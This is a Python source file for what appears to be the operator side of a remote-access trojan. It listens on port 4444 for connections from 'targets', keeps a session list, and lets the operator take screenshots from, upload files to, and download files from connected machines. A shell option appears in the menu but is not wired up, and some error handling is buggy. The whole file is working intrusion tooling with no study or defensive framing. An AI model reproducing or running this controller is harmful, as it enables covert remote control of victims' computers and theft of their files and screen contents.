import os, socket, time, threading, sys
from queue import Queue

queue = Queue()
threads = 2
jobs = [1, 2]

addresses = []
connections = []

selected_connection = None
selected_connection_id = -1

host = "127.0.0.1"
port = 4444
buffer_bytes = 1024


def decode_utf8(bytes):
    return bytes.decode("utf-8")


def remove_quotes(string):
    return string.replace("\"", "")


def send_data(data):
    selected_connection.send(data)


def receive_data(buffer):
    return selected_connection.recv(buffer)


def create_socket():
    global s
    try:
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error() as e:
        print("[-] Error creating the handler:", str(e))


def socket_bind():
    global s
    try:
        print("[*] Listening on port:", str(port))
        s.bind((host, port))
        s.listen(20)
    except socket.error() as e:
        print("[-] Error binding the handler:", str(e))
        socket_bind()


def socket_accept():
    while True:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            connections.append(conn)
            client_info = decode_utf8(conn.recv(buffer_bytes)).split("',")
            client_info.append(address[0])
            client_info.append(address[1])
            addresses.append(client_info)
            print("\n[+] Connection has been estabilished:", address[0])
        except socket.error:
            print("[-] Error accepting connections")


def create_threads():
    for i in range(threads):
        thread = threading.Thread(target=work)
        thread.daemon = True
        thread.start()

    queue.join()


def menu_help():
    print("")
    print("                    -l         List all your open sessions")
    print("                    -x         Kill all sessions")
    print("                    -i id      Interact with a session")
    print("                    -h         See all availabe commands")
    print("                    -c         Clear terminal")
    print("")


def menu_command_options():
    print("")
    print("                    -m         Send message")
    print("                    -s         Take a screenshot")
    print("                    -u         Send File")
    print("                    -d         Download File")
    print("                    -c         Gain access to shell")
    print("                    -b         Put the session in background")
    print("                    -k         Kill session")
    print("                    -h         See all commands")
    print("")


def select_connection(connection_id):
    global conn, selected_connection, selected_connection_id

    try:
        connection_id = int(connection_id)
        conn = connections[connection_id]
        print("\n[*] Connecting to: ", addresses[connection_id][2], " - ", addresses[connection_id][0],
              addresses[connection_id][1])
        selected_connection = conn
        selected_connection_id = connection_id
    except:
        print("\n[-] Invalid session!")
        return


def upload_file():
    global selected_connection

    while True:
        file_directory = input('Type the file directory >> ')
        try:
            file_size = os.path.getsize(file_directory)
            break
        except:
            print("[-] File not found!")

    splited_directory = file_directory.split("/")
    file_name = splited_directory[len(splited_directory)-1]
    send_data(f'upload-file {file_name}'.encode())

    file = open(file_directory, "rb")
    bytes_read = file.read(4096)

    while bytes_read:
        send_data(bytes_read)
        bytes_read = file.read(4096)

    time.sleep(1)
    file.close()
    send_data('done'.encode())


def download_file():
    global selected_connection

    file_directory = input('Type the file directory >> ')
    file_name = file_directory.split('/')[-1]

    send_data(f'download-file {file_directory}'.encode())

    if receive_data(4096) == 'NotFound'.encode():
        print('File not found!')
        return

    file = open(file_name, 'wb')

    print("[*] Downloading file...")

    while True:
        response = receive_data(4096)
        try:
            if decode_utf8(response) == 'done':
                break
            file.write(response)
        except:
            file.write(response)

    print("\n[+] File downloaded")

    file.close()


def send_message():
    message = input('Write the message >> ')
    send_data('message'.encode())
    time.sleep(0.2)
    send_data(message.encode())
    time.sleep(0.2)
    send_data('done'.encode())


def receive_screenshot():
    global selected_connection

    selected_connection.send(str.encode("screenshot"))
    print("[*] Taking a screenshot...")
    file_name = time.strftime("%Y%m%d%H%M%S" + ".png")
    picture = open(file_name, "wb")

    while True:
        response = receive_data(4096)
        try:
            if decode_utf8(response) == 'done':
                break
            picture.write(response)
        except:
            picture.write(response)

    print("\n[+] Received screenshot from now...")
    picture.close()


def sleep_session():
    global selected_connection, selected_connection_id

    print(f"\n[*] Putting session {selected_connection_id} to sleep...")
    selected_connection = None
    selected_connection_id = -1


def interact():
    menu_command_options()
    while True:
        choice = input("\n>> ")
        if (choice == '-h'):
            menu_command_options()
        elif choice == '-b':
            sleep_session()
            return
        elif choice == '-s':
            receive_screenshot()
        elif choice == '-u':
            upload_file()
        elif choice == '-d':
            download_file()
        elif choice == '-m':
            send_message()
        elif choice == '-k':
            close_connection_by_id()
            return


def close():
    global connections, addresses

    if (len(addresses) == 0):
        print("Good bye...")
        return

    for counter, conn in enumerate(connections):
        conn.send(str.encode("exit"))
        conn.close()

    del connections
    del addresses
    connections = []
    addresses = []
    print("Good bye...")


def close_connection_by_id():
    global selected_connection, selected_connection_id, connections, addresses
    conn = connections[selected_connection_id]
    addresses.pop(selected_connection_id)
    connections.pop(selected_connection_id)
    conn.send(str.encode("exit"))
    conn.close()

    print(f"\n[-] Killing session {selected_connection_id}...")

    selected_connection = None
    selected_connection_id = -1


def list_connections():
    if (len(addresses)) > 0:
        print("\nConnected targets: ")
        print("====================")
        print("")
        print("ID -  SESSION")
        for i, address in enumerate(addresses):
            print(i, " - ", address[2], " ", address[0], address[1])
    else:
        print("\n[-] No connections.")


def main_menu():
    menu_help()

    while True:
        choice = input("\n>> ")
        if choice == "-l":
            list_connections()
        elif choice == "-h":
            menu_help()
        elif choice == "-x":
            close()
            break
        elif choice == '-c':
            os.system('clear')
            menu_help()
        elif (choice[:2] == "-i" and len(choice) > 2):
            select_connection(choice[3:])
            if (selected_connection is not None):
                interact()
        else:
            print("\n[-] Invalid choice!")


def work():
    while True:
        value = queue.get()
        if value == 1:
            create_socket()
            socket_bind()
            socket_accept()
        elif value == 2:
            while True:
                time.sleep(0.2)
                if (len(addresses) > 0):
                    main_menu()
                    break
        queue.task_done()
        queue.task_done()
        sys.exit(0)


def create_jobs():
    for thread in jobs:
        queue.put(thread)
    queue.join()


def start_server():
    create_threads()
    create_jobs()
